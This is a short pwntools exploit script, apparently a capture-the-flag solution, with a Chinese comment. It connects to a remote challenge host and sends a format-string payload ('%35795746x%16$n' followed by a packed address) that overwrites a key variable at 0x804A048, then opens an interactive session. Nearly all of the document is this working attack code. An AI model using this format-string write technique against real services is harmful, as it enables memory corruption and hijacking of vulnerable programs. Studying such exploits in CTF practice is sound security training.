import pwn

pwn.context(arch='i386', os='linux')

#p = pwn.process('./9926c1a194794984978011fc619e3301')
p = pwn.remote('220.249.52.133', 30149)

key_addr = 0x804A048
payload = b'%35795746x%16$n\x00' + pwn.p32(key_addr)    # %x：写入35795746个字符，$16$n：偏移量为16，payload = arg1 + arg2（中间用\x00隔开）

p.sendline(payload)

p.interactive()
